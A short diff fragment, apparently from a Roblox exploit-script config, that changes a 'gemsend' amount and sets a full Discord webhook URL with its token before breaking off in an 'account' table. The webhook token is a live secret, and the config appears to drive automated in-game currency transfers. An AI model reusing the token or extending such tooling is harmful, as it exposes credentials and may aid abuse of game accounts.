@@ -1,4 +1,4 @@
-getgenv().gemsend = "370k"
+getgenv().gemsend = "287k"
 getgenv().url =
 "https://discord.com/api/webhooks/1328357657152585799/QXtF0pUNsDLdhNRPUFN2QsfhEzAEwfCAxjdDi0JxNVHW818kxhKZkqg9PilVPan3Gt8N"
 getgenv().account = {
